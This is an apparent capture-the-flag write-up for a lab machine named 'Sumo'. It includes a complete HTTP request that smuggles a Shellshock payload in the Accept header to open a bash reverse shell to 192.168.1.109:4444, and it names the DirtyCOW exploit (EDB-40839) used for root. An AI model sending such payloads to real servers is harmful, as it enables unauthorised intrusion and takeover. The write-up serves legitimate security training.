# Sumo

netdiscover found this box running on the following IP

```
192.168.1.104
```

nikto identified shellshock

![[Pasted image 20220709104036.png]]

We are able to get a reverse shell as `www-data` using the following web request.

```
GET /cgi-bin/test.sh HTTP/1.1
Host: 192.168.1.104
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: () { :;}; /bin/bash -i >& /dev/tcp/192.168.1.109/4444 0>&1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

linpeas and linux-exploit-suggester both identified dirtycow as a possible privesc avenue.

I was struggling to get the exploit compiled, as I was getting an error:

```
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

I turned to a walkthrough to see what I might be missing. And we found a way to fix the error:

```
PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/:/usr/bin;export PATH
```

We were able to get a root shell using [dirtycow EDB-40839](https://www.exploit-db.com/exploits/40839)

## Root flag

![[Pasted image 20220709113217.png]]

